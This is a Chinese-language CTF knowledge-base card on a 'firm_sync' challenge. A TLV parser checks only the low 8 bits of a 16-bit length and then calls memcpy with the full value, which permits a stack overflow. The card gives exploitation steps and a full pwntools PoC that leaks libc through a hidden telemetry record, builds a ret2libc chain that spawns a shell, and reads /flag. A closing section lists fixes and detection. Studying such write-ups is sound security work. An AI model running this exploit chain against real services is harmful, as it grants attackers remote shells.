---
id: binary-pwn-stack-tlv-length-low-byte-check-memcpy-overflow
title: TLV 协议长度低字节检查绕过：16 位 memcpy 栈溢出 + 隐藏遥测泄露 libc
type: scenario
domain: binary
path: binary/pwn/stack
technique: tlv-length-low-byte-check-memcpy-overflow
tags:
- pwn
- stack
- tlv
- integer-truncation
- memcpy
- rop
- leak
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V116
  verified_at: '2026-11-06T01:50:35+08:00'
  notes: 已对照原文 firm_sync 一节核对：TLV header magic=0x53524657/count/checksum、checksum=tag^calc(data) 的跳过语义、tag=3 仅检查 len 低 8 位而 memcpy 用 16 位、len=0x0160、栈偏移 0x78、tag=7 SRXM+key=0xa7 泄露 puts@got 及 rol/ror 逆变换、seccomp 返回后加载、ret2libc 链均一致。未验证点：PoC 未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/stack/binary-pwn-stack-tlv-length-low-byte-check-memcpy-overflow/
draft: false
kb_aliases:
- TLV 长度截断
- 低字节检查
- 16 位 memcpy
- 隐藏遥测
- firm_sync
- tag=7 泄露
---

## 一句话结论

当 TLV 解析器只用 `len` 的低 8 位做“≤0x60”检查、却用完整的 16 位 `len` 调 `memcpy` 时，构造 `len=0x0160` 即可通过检查并复制 0x160 字节到栈缓冲区，覆盖返回地址；本题还通过 `tag=7` 隐藏遥测与 1 字节 key 泄露 `puts@got`，先拿 libc 基址再做 `ret2libc`。

## 原理

- **TLV 格式**：`Header: uint32 magic=0x53524657, uint16 count, uint16 checksum`；`Record: uint16 tag, uint16 len, data[len]`。主循环最多处理 `0xc` 条记录，`len<=0x240`。
- **checksum 语义**：`checksum = tag ^ calc(data)`；若与包头 checksum 相等，则“跳过该记录”。它不是整包校验，而是记录级比较值，可被攻击者计算/利用。
- **长度截断**：`tag=3`（boot script）只检查 `len & 0xff <= 0x60`，但 `memcpy` 使用完整 `len`。`len=0x0160` 的低字节是 `0x60`（通过），实际复制 `0x160` 字节到栈上小缓冲区，覆盖保存的 rbp/返回地址。
- **隐藏遥测**：`tag=7` 且 data 前 4 字节为 `SRXM` 时，程序用包头 checksum 做内部认证；选 `key=0xa7` 可让认证通过，并打印 64 位泄露值。该值是 `puts@got` 经两次按位旋转和异或混淆后的结果；逆变换得到 `puts@libc`，减去 libc 偏移得到基址。
- **ROP**：拿到 libc 基址后，构造 `ret`（对齐）+ `pop rdi; ret` + `/bin/sh` + `system`；程序 seccomp 在主逻辑返回后才加载，返回前劫持即可先拿 shell。
- **为什么成立**：检查与使用长度不一致（低 8 位 vs 16 位）是经典的整数截断/检查绕过；隐藏遥测提供信息泄露，组合成完整利用链。

## 触发条件

- TLV 解析器存在“检查短长度、使用长长度”的整数截断；`len` 是 16 位，缓冲区小于 `0x160`。
- 栈缓冲区到返回地址偏移固定（本题 `0x78`），可覆盖保存现场。
- 有信息泄露原语（本题 `tag=7` 隐藏遥测 + 1 字节 key），能恢复 libc 基址。
- 目标有可用的 `/bin/sh`、`system` 或 ORW gadget；seccomp 在返回后才加载（或可绕）。
- 攻击者能多次发送 TLV 记录并读取响应。

## 利用步骤

1. 逆向 TLV 主循环，确认 magic/count/checksum、tag 分支、长度检查与 `memcpy` 参数。
2. 定位 `tag=3` 的长度检查：只取低 8 位；确认栈缓冲区大小与返回地址偏移（本题 `0x78`）。
3. 触发 `tag=7` 隐藏遥测：构造 `SRXM` + 4 字节 key 记录，令 checksum 通过；读取泄露的乱码值。
4. 按程序中的旋转/异或逆变换恢复 `puts@got`，减去 libc `puts` 偏移得到 libc 基址。
5. 构造 ROP：`b"A"*0x78 + ret + pop_rdi + binsh + system`，用 `len=0x160` 的 `tag=3` 记录发送。
6. 返回前劫持执行流，拿 shell 后读 `/flag`；本题真实 flag 在 `/flag`（`/flag.example` 是占位）。

## PoC

```python
from pwn import *
import re

context.clear(arch="amd64")
STATE = int.from_bytes(b"RSrorrim", "little")
MASK_CONST = 0x46534D335F544C56
LEAK_KEY = 0xA7

def rol64(x, r):
    r &= 63
    return ((x << r) & ((1 << 64) - 1)) | (x >> (64 - r))

def ror64(x, r):
    r &= 63
    return (x >> r) | ((x << (64 - r)) & ((1 << 64) - 1))

def auth_checksum(key):
    tmp = ((key * 0x3137) ^ STATE ^ 0xA55A4D33) & ((1 << 64) - 1)
    return ((tmp & 0xFFFFFFFF) ^ ((tmp >> 7) & 0xFFFFFFFF)) & 0xFFFF

def decode_leak(scrambled, key):
    mix = rol64(STATE ^ MASK_CONST, key & 0x1F)
    rot = ((key >> 3) & 0x1F) + 1
    return ror64(scrambled, rot) ^ mix

libc = ELF("./libc.so.6")
io = remote(HOST, PORT)
leak_record = b"SRXM" + bytes([0, LEAK_KEY ^ 0x5A, 0, 0])
checksum = auth_checksum(LEAK_KEY)
header = p32(0x53524657) + p16(2) + p16(checksum)
io.send(header + p16(7) + p16(len(leak_record)) + leak_record)
line = io.recvline()
scrambled = int(re.search(rb"\[a7\]=([0-9a-f]{16})", line).group(1), 16)
puts_addr = decode_leak(scrambled, LEAK_KEY)
libc.address = puts_addr - libc.symbols["puts"]

rop = ROP(libc)
chain = flat(
    b"A" * 0x78,
    rop.find_gadget(["ret"]).address,
    rop.find_gadget(["pop rdi", "ret"]).address,
    next(libc.search(b"/bin/sh\x00")),
    libc.symbols["system"],
).ljust(0x160, b"B")
io.send(p16(3) + p16(len(chain)) + chain)
io.sendline(b"cat /flag")
print(io.recvrepeat(3).decode(errors="replace"))
```

## 变体与关联

- **变体（长度类型）**：`uint8_t` 检查 + `size_t` 使用、`len & 0xff`、`len % 256`、符号扩展等；核心是检查宽度 < 使用宽度。
- **变体（泄露源）**：隐藏命令/遥测/日志/错误信息泄露 GOT/libc 指针；也可用格式化字符串/未初始化栈。
- **变体（执行）**：ret2libc、ORW（seccomp）、ret2csu；本题 seccomp 在返回后加载，先劫持即可。
- **关联卡片**：[[binary-pwn-stack-ret2text-win-plus-one-align]]（ret2win+对齐）、[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式化字符串泄露）、[[binary-pwn-rop-ret2csu-bss-binsh-libc-offset-mismatch]]（ROP 链）。
- **边界**：栈偏移/缓冲区大小需按目标确认；seccomp 若在解析前加载，需 ORW；泄露解码公式依赖程序常量，需逆向核对。

## 检测与防御

- **代码修复**：长度检查与 `memcpy` 使用同一宽度/同一变量；对 `len` 做上界检查并拒绝截断值；使用 `sizeof(buf)` 限制。
- **信息泄露**：不要向未授权客户端输出 GOT/指针/内部遥测；隐藏命令需强认证且不泄露地址。
- **加固**：Canary、PIE、Full RELRO、seccomp 在入口加载；编译期 `-D_FORTIFY_SOURCE=2` 检查 `memcpy` 长度。
- **检测**：审计 TLV/协议解析中的 `& 0xff`、`uint8_t` 与 `memcpy` 组合；fuzz 长度边界（0x60/0x160/0x240）。
